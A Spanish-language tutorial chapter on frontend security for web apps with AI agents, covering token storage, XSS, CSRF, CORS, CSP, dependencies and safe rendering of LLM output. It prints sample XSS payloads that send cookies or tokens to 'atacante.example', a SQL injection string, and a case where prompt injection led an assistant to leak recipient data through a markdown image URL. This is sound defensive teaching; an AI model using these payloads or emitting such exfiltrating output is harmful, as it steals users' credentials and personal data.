---
slug: seguridad-frontend
titulo: Seguridad en el frontend
resumen: Cómo proteger una aplicación web con agentes: dónde guardar tokens, XSS, CSRF, CORS, CSP, dependencias y salida de LLMs mostrada en el navegador.
lectura: 16
---

## La idea central

El navegador ejecuta código de muchos orígenes y muestra contenido que escribieron otras personas. La seguridad del frontend consiste en decidir qué código puede correr en la página, qué puede leer y hacia dónde puede enviar datos. Casi todos los ataques clásicos (XSS, CSRF, clickjacking) explotan que el navegador confía en algo que no debería: un texto que se interpreta como HTML, una cookie que viaja sola, un iframe que el usuario no ve.

Las aplicaciones con agentes agregan una fuente nueva de contenido no confiable: la salida del modelo, que puede incluir markdown, enlaces e imágenes influidos por una inyección de prompt escondida en un ticket o en una página web. La regla de este tema es simple: **todo lo que el modelo devuelve se trata como si lo hubiera escrito un desconocido**. El modelo de amenazas del agente está en [Seguridad de LLMs y agentes](#t/seguridad-agentes); aquí se ve qué le toca hacer al frontend para que ese texto no se convierta en código ni en un canal de salida de datos.

## Conceptos

### Dónde guardar los tokens

Después del login (ver [Autenticación, JWT y OAuth](#t/autenticacion)), la aplicación tiene un token que prueba quién es el usuario. Hay que guardarlo en algún lado, y cada lugar tiene un riesgo distinto:

1. **localStorage o sessionStorage:** cualquier JavaScript que corra en la página puede leerlos con `localStorage.getItem("token")`. Si un atacante logra ejecutar un script (XSS), se lleva el token y lo usa desde su máquina hasta que expire.
2. **En memoria (una variable de JavaScript):** un XSS lo roba con más dificultad, pero puede usarlo mientras la pestaña está abierta. Se pierde al recargar, así que suele combinarse con un refresh token en cookie.
3. **Cookie HttpOnly:** el JavaScript no puede leerla; el navegador la adjunta sola a cada petición al dominio. Un XSS puede hacer peticiones en nombre del usuario mientras está en la página, pero no puede llevarse la credencial. El costo es que, como la cookie viaja sola, aparece el riesgo de CSRF.

Los atributos de la cookie definen cuánto la protege el navegador:

- `Secure`: solo viaja por HTTPS.
- `HttpOnly`: invisible para `document.cookie`.
- `SameSite=Strict`: no se envía en ninguna petición iniciada desde otro sitio, ni siquiera al seguir un enlace.
- `SameSite=Lax`: se envía al navegar con un enlace (GET de nivel superior), pero no en formularios POST, iframes ni `fetch` desde otro sitio. Es el valor por defecto en los navegadores modernos cuando no se indica nada.
- `SameSite=None`: se envía siempre; exige `Secure`. Solo tiene sentido para integraciones embebidas en otro sitio.
- Prefijo `__Host-`: una cookie llamada `__Host-sesion` solo se acepta si tiene `Secure`, `Path=/` y no tiene `Domain`. Así queda atada al host exacto y un subdominio comprometido no puede sobrescribirla.

```http
Set-Cookie: __Host-sesion=a8f3...; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600
```

### El patrón backend-for-frontend (BFF)

El **BFF** es un backend pequeño dedicado a una interfaz. El navegador habla solo con el BFF usando una cookie de sesión HttpOnly; el BFF guarda los tokens de acceso (los de OAuth o los de las APIs internas) del lado del servidor y los agrega a cada llamada hacia atrás. El JavaScript de la página nunca ve un token.

**Ejemplo:** el panel de operaciones de Rumbo hace `GET /bff/pedidos?zona=norte` con la cookie `__Host-sesion`. El BFF busca la sesión en Redis, obtiene el token de acceso del usuario (válido 10 minutos, renovado por el BFF), llama a la API de pedidos con `Authorization: Bearer ...` y devuelve el JSON. Si hay un XSS, el atacante puede hacer peticiones desde esa pestaña, pero no tiene un token para usar desde otro lado.

| Opción | XSS puede robar la credencial | Riesgo de CSRF | Sobrevive a recargar | Complejidad |
|---|---|---|---|---|
| localStorage | Sí | No | Sí | Baja |
| sessionStorage | Sí | No | Solo en la pestaña | Baja |
| Memoria + refresh en cookie | Difícil (sí puede usarlo) | Bajo, solo en el endpoint de refresh | Sí, vía refresh | Media |
| Cookie HttpOnly directa | No | Sí, mitigar con SameSite y tokens | Sí | Media |
| BFF con cookie de sesión | No (no hay token en el navegador) | Sí, mitigado igual que arriba | Sí | Media-alta: un servicio más |

**Por qué importa:** ninguna opción sale ilesa de un XSS, pero no es lo mismo "el atacante actuó 5 minutos en una pestaña" que "tiene un token válido por 24 horas".

### XSS: cuando el texto se vuelve código

Cross-site scripting (XSS) ocurre cuando datos controlados por un atacante terminan ejecutándose como JavaScript en la página de otro usuario. Hay tres variantes:

- **Reflejado:** el dato viene en la petición y vuelve en la respuesta. Una URL `/buscar?q=<script>...</script>` que el servidor imprime sin escapar.
- **Almacenado:** el dato se guarda (una nota de pedido, un comentario) y se ejecuta cada vez que alguien lo ve. Es el más peligroso porque afecta a todos los que abren esa vista.
- **Basado en DOM:** el servidor no participa; el propio JavaScript toma algo de `location.hash` o de una respuesta de API y lo escribe en un lugar peligroso.

Esos lugares peligrosos se llaman **sinks**: APIs que interpretan una cadena como HTML o código. Los principales son `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, `eval`, `new Function`, atributos `href` con `javascript:` y, en React, `dangerouslySetInnerHTML`.

```javascript
// Vulnerable: la nota se interpreta como HTML
celda.innerHTML = pedido.nota;

// Seguro: la nota se muestra como texto
celda.textContent = pedido.nota;
```

Las defensas, en orden de preferencia:

1. **Codificación de salida (output encoding):** convertir `<` en `&lt;` y similares según el contexto (HTML, atributo, URL). Los frameworks modernos lo hacen por defecto: en React, `{pedido.nota}` ya está escapado.
2. **Sanitización:** cuando de verdad hay que mostrar HTML (por ejemplo, markdown renderizado), se pasa por un sanitizador basado en lista permitida, como DOMPurify, que deja `<b>` o `<a>` y elimina `<script>`, `onerror` y `javascript:`.
3. **Trusted Types:** una función del navegador, activada desde la CSP, que hace que sinks como `innerHTML` rechacen cadenas comunes y solo acepten objetos creados por una política aprobada (por ejemplo, la salida del sanitizador). Convierte una regla de revisión en un error en tiempo de ejecución.

**Ejemplo:** una nota con `<img src=x onerror="fetch('https://atacante.example/?c='+document.cookie)">`. Con `innerHTML`, la imagen falla al cargar y el `onerror` corre. Con `textContent`, el usuario ve el texto literal y no pasa nada.

### Mostrar la salida de un LLM sin riesgo

Las interfaces de chat convierten markdown en HTML. Un modelo influido por una inyección puede escribir HTML crudo, enlaces engañosos o imágenes que filtran datos. Una configuración segura:

1. **Desactivar HTML crudo** en el renderizador de markdown. Casi todas las librerías tienen una opción para que `<script>` o `<iframe>` dentro del markdown se muestren como texto.
2. **Sanitizar el HTML resultante** con una lista permitida de etiquetas y atributos, aunque el renderizador ya esté configurado: es la segunda capa.
3. **Enlaces:** agregar `rel="noopener noreferrer"` y `target="_blank"`, permitir solo `https:` y mostrar el dominio real. `noopener` evita que la página abierta controle la pestaña original; `noreferrer` evita enviarle la URL de origen.
4. **Imágenes externas:** no cargarlas automáticamente. Una imagen con `?d=<datos>` en la URL entrega los datos apenas el navegador la pide, sin clic. Se muestran solo imágenes de dominios propios o se reemplazan por un enlace "cargar imagen de dominio.example".
5. **Bloques de código:** se muestran como texto con resaltado de sintaxis; nunca se ejecutan ni se insertan en el DOM como HTML, aunque digan `html`.

```javascript
import { marked } from "marked";
import DOMPurify from "dompurify";

const html = marked.parse(respuestaDelModelo);
const limpio = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ["p", "strong", "em", "ul", "ol", "li", "code", "pre", "a", "table", "tr", "td", "th"],
  ALLOWED_ATTR: ["href"],
});
contenedor.innerHTML = limpio; // las imágenes quedan fuera de la lista
```

**Por qué importa:** el canal de exfiltración por imágenes descrito en [Seguridad de LLMs y agentes](#t/seguridad-agentes) se cierra en el frontend: lo que el backend no limpió, el navegador no debería pedirlo.

### CSRF: peticiones que el usuario no hizo

Cross-site request forgery (CSRF) aprovecha que las cookies viajan solas. El usuario tiene sesión abierta en `panel.rumbo.example` y visita `sitio-malicioso.example`, que contiene un formulario oculto que hace `POST https://panel.rumbo.example/api/pedidos/88412/cancelar`. El navegador adjunta la cookie de sesión y el servidor ve una petición autenticada legítima.

Las defensas se combinan:

- **SameSite=Lax o Strict:** el navegador no envía la cookie en POST iniciados desde otro sitio. Es la base, pero no cubre peticiones desde subdominios del mismo sitio ni navegadores viejos.
- **Token anti-CSRF:** el servidor genera un valor aleatorio por sesión, el frontend lo envía en una cabecera (`X-CSRF-Token`) y el servidor lo compara. El sitio atacante no puede leerlo.
- **Verificar la cabecera `Origin`** en peticiones que cambian estado: si no es `https://panel.rumbo.example`, se rechaza.
- **No cambiar estado con GET:** si cancelar un pedido fuera un GET, bastaría una etiqueta `<img>` en otro sitio.

### Clickjacking

El atacante carga la página legítima en un iframe invisible bajo un botón señuelo. El usuario cree que hace clic en el señuelo, pero hace clic en "aprobar reasignación" del panel real.

La defensa es decirle al navegador quién puede enmarcar la página: `Content-Security-Policy: frame-ancestors 'none'` (o `'self'` si la propia aplicación usa iframes). La cabecera antigua `X-Frame-Options: DENY` hace lo mismo y conviene enviarla también para navegadores viejos.

### CORS mal configurado

CORS (Cross-Origin Resource Sharing) permite que un servidor le diga al navegador qué otros orígenes pueden **leer** sus respuestas. No autentica a nadie ni impide que la petición llegue: un `curl` lo ignora por completo. CORS relaja una restricción del navegador; no protege al servidor.

Los errores típicos:

1. **Reflejar cualquier `Origin` con credenciales:** el servidor copia el `Origin` recibido en `Access-Control-Allow-Origin` y agrega `Access-Control-Allow-Credentials: true`. Resultado: cualquier sitio puede leer, con la cookie del usuario, las respuestas de la API.
2. **Aceptar el origen `null`:** lo envían iframes con sandbox y archivos locales, que un atacante puede fabricar fácilmente.
3. **Comodines mal validados:** una regla que acepta cualquier origen que termine en `rumbo.example` también acepta `atacante-rumbo.example`; una que acepta `*.rumbo.example` hereda el riesgo de cualquier subdominio olvidado.

```python
PERMITIDOS = {"https://panel.rumbo.example", "https://comercios.rumbo.example"}

def cors(origin):
    if origin in PERMITIDOS:  # comparación exacta, sin regex
        return {"Access-Control-Allow-Origin": origin,
                "Access-Control-Allow-Credentials": "true",
                "Vary": "Origin"}
    return {}
```

Los detalles de las peticiones de verificación previa (preflight) están en [HTTP de punta a punta](#t/http).

### Content Security Policy

La CSP es una cabecera que le dice al navegador de dónde cargar scripts, estilos e imágenes y hacia dónde conectarse. No elimina un bug de XSS, pero reduce mucho lo que un atacante puede hacer con él.

Las directivas más útiles:

- `script-src` con **nonces**: el servidor genera un valor aleatorio por respuesta (`nonce-r4nd0m`) y solo los `<script nonce="r4nd0m">` se ejecutan. Un script inyectado no conoce el nonce. Alternativa: **hashes** del contenido exacto de cada script.
- `'strict-dynamic'`: los scripts con nonce válido pueden cargar otros scripts, sin tener que listar cada dominio. Simplifica aplicaciones con bundlers.
- `connect-src`: a qué orígenes puede hacer `fetch`, WebSocket o EventSource la página. Limita adónde puede enviar datos un script inyectado.
- `img-src`: de dónde se cargan imágenes. Con `'self'` y el CDN propio, una imagen hacia `atacante.example` no se pide.
- `frame-ancestors`: quién puede enmarcar la página (clickjacking).
- `object-src 'none'` y `base-uri 'none'`: cierran vías antiguas de inyección.

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-r4nd0m' 'strict-dynamic';
  connect-src 'self' https://api.rumbo.example;
  img-src 'self' https://cdn.rumbo.example data:;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'none';
  require-trusted-types-for 'script';
  report-uri /csp-reportes
```

El despliegue se hace en dos pasos. Primero se envía como `Content-Security-Policy-Report-Only`: el navegador no bloquea nada, pero reporta cada violación. Con los reportes se corrigen los scripts legítimos; recién después se pasa a la cabecera que bloquea, y los reportes quedan activos como alarma.

**Ejemplo:** en la primera semana en modo reporte, el panel de Rumbo registra 1.200 violaciones (cifras hipotéticas): 900 de un script de analítica en línea, 250 de extensiones del navegador y 50 de imágenes de un proveedor de mapas. Se agrega nonce al script, se ignoran las extensiones y se suma el dominio de mapas a `img-src`.

### Inyección más allá del navegador

La misma idea del XSS (datos que se interpretan como código) aparece en el backend, y la salida de un LLM es una fuente más de datos no confiables:

- **SQL:** concatenar `"... WHERE zona = '" + zona + "'"` permite `' OR 1=1 --`. Se usan consultas parametrizadas: `cursor.execute("SELECT ... WHERE zona = %s", (zona,))`. Si el modelo elige filtros, elige parámetros, nunca escribe la consulta.
- **HTML en el servidor:** plantillas con escape automático, también en correos generados con el resumen de un caso.
- **Comandos:** nada de `os.system(f"convertir {archivo}")` con un nombre que pudo sugerir el modelo. Se llama al programa con una lista de argumentos y sin shell: `subprocess.run(["convertir", archivo], shell=False)`, y se valida el valor contra un patrón.

### Dependencias y cadena de suministro

Una aplicación frontend arrastra cientos de paquetes, y cada uno corre con los permisos del código propio. Prácticas mínimas:

1. **Lockfile versionado** (`package-lock.json`, `pnpm-lock.yaml`) e instalación con `npm ci`, para que CI instale exactamente lo revisado.
2. **Auditoría en CI** (`npm audit` o una herramienta equivalente) que falle con vulnerabilidades altas en dependencias de producción.
3. **Pocas dependencias:** una función de 10 líneas no justifica un paquete con 40 dependencias transitivas.
4. **Cuidado con el typosquatting:** paquetes con nombres casi iguales a uno popular (`reqeusts`, `markdown-it-sanitise`) que publican atacantes. Se revisa el nombre exacto antes de agregar algo.

Para scripts de terceros cargados desde un CDN, **Subresource Integrity (SRI)** agrega un hash del archivo esperado. Si el CDN sirve otro contenido, el navegador no lo ejecuta:

```html
<script src="https://cdn.example/libreria@4.2.1/min.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

SRI solo funciona con versiones fijas: si la URL apunta a "la última versión", el hash deja de coincidir en la próxima publicación.

### Los secretos nunca van en el bundle

Todo lo que llega al navegador es público: el bundle de JavaScript se puede descargar y leer, aunque esté minificado. Una variable `VITE_LLM_API_KEY` o `NEXT_PUBLIC_...` termina como texto plano dentro de un archivo `.js`.

Llamar a un proveedor de LLM desde el navegador equivale a publicar la clave: cualquiera puede extraerla y consumir tokens a cuenta de la empresa. El patrón correcto es pasar siempre por el backend:

1. El navegador llama a `POST /api/asistente` con su sesión.
2. El backend autentica al usuario, aplica límites por usuario (por ejemplo, 30 mensajes por hora y 200.000 tokens por día, hipotéticos), agrega el prompt de sistema y llama al proveedor con la clave guardada en el gestor de secretos.
3. La respuesta vuelve al navegador, idealmente en streaming.

El manejo de la clave del lado del servidor se ve en el tema de secretos y cifrado.

### Inyección de prompt que llega por la web

El asistente de Rumbo lee contenido que no controla: notas que cargan los comercios, páginas de seguimiento que comparten, URLs que un usuario pega en el chat. Cualquiera de ellas puede contener instrucciones para el modelo. La responsabilidad se reparte:

- **Backend:** restringe qué URLs puede leer el agente, ejecuta herramientas con los permisos del usuario y quita de la respuesta las URLs fuera de la lista permitida.
- **Frontend:** asume que la sanitización del backend puede fallar y aplica la suya: markdown sin HTML crudo, sin imágenes externas, enlaces con dominio visible y una CSP con `img-src` y `connect-src` acotados. Además, las acciones con efecto (reprogramar una entrega) se confirman con un botón de la interfaz, no con texto del modelo.

Juntas convierten una inyección exitosa en un texto raro en pantalla en lugar de una fuga de datos.

## Casos prácticos

### XSS almacenado en una nota de comercio

**Situación:** un comercio escribe en las indicaciones de entrega: `<img src=x onerror="fetch('https://atacante.example/?t='+localStorage.token)">`. La consola de operaciones muestra las notas con `dangerouslySetInnerHTML` para respetar los saltos de línea. Cada operador que abre ese pedido envía su token al atacante.

**Qué se hace:** la nota se muestra como texto (`{pedido.nota}` con `white-space: pre-wrap` para los saltos de línea). Cada uso de `dangerouslySetInnerHTML` en el repositorio pasa a exigir sanitizador y aprobación en la revisión. Se activa una CSP con nonces y `connect-src` acotado, que habría bloqueado el `fetch`. Los tokens de los operadores se revocan: estaban en localStorage y se asume que se filtraron.

### La imagen en markdown que filtraba la conversación

**Situación:** una página de seguimiento que el asistente leyó contenía instrucciones ocultas. El modelo terminó su respuesta con `![](https://img.atacante.example/p.png?d=nombre-direccion-telefono)`. El chat la renderizó y el navegador pidió la imagen, con los datos del destinatario en la URL.

**Qué se hace:** tres capas. El backend elimina de la respuesta las URLs fuera de la lista permitida y emite una alerta. El renderizador de markdown reemplaza las imágenes externas por un enlace con el dominio visible. La CSP limita `img-src` a `'self'` y al CDN propio: aunque fallen las dos primeras capas, el navegador no hace la petición y el intento aparece en los reportes.

### La clave del proveedor de LLM dentro del bundle

**Situación:** un prototipo del asistente en el portal de comercios llamaba al proveedor de LLM desde el navegador con una variable de entorno pública, y pasó a producción así. Semanas después, el consumo diario de tokens se multiplica por 8 sin más usuarios.

**Qué se hace:** se revoca la clave de inmediato y se emite una nueva, guardada solo en el gestor de secretos. Se agrega el endpoint `/api/asistente` en el backend, con autenticación, límite por comercio y registro de consumo. En CI se suma un escáner de secretos que revisa el bundle generado, no solo el código fuente, y falla si encuentra patrones de claves conocidas.

### Del localStorage a cookies HttpOnly con un BFF

**Situación:** el panel de operaciones guarda el access token y el refresh token en localStorage. Una revisión de seguridad señala que cualquier XSS futuro se llevaría sesiones de 30 días.

**Qué se hace:** se introduce un BFF delante de las APIs. El login termina en el BFF, que guarda los tokens en su almacén de sesiones y entrega `__Host-sesion` con `Secure; HttpOnly; SameSite=Lax`. Las peticiones que cambian estado llevan un token anti-CSRF en cabecera y el BFF verifica `Origin`. La migración se hace por etapas: ambos mecanismos conviven detrás de una feature flag, luego se elimina el código que lee localStorage y se borran los valores viejos. El JavaScript del panel ya no tiene ninguna credencial que robar.

## Errores comunes

- **Creer que CORS protege la API.** CORS solo controla qué orígenes pueden leer respuestas desde un navegador; la autenticación y la autorización se verifican siempre en el servidor.
- **Usar `innerHTML` o `dangerouslySetInnerHTML` "solo para formatear".** Casi siempre hay una alternativa con texto y CSS; si no la hay, se pasa por un sanitizador con lista permitida.
- **Renderizar la salida del modelo como markdown completo.** HTML crudo e imágenes externas abren XSS y exfiltración; se desactivan y se sanitiza el resultado.
- **Poner claves de proveedores en variables de entorno públicas del frontend.** Todo lo que está en el bundle es público; las llamadas a LLMs pasan por el backend con límites por usuario.
- **Activar una CSP estricta de golpe en producción.** Rompe funciones legítimas y lleva a relajarla con `'unsafe-inline'`; se empieza en modo report-only y se ajusta con datos.
- **Confiar solo en SameSite contra CSRF.** No cubre subdominios del mismo sitio ni todos los clientes; se combina con tokens anti-CSRF y verificación de `Origin`.

## Para discutir en equipo

- ¿Dónde guardan hoy los tokens nuestras interfaces, y cuánto tiempo podría usar un atacante una credencial robada con un XSS?
- ¿Qué sinks peligrosos (`innerHTML`, `dangerouslySetInnerHTML`, `eval`) existen en nuestros repositorios, y quién aprueba un uso nuevo?
- ¿Cuál sería una CSP realista para la interfaz del asistente, y qué terceros nos impiden hoy tener un `connect-src` e `img-src` acotados?
- Si el sanitizador del backend fallara, ¿qué capa del frontend frenaría una imagen que filtra datos de un destinatario?
- ¿Cómo detectaríamos una clave o un secreto que terminó en un bundle publicado?
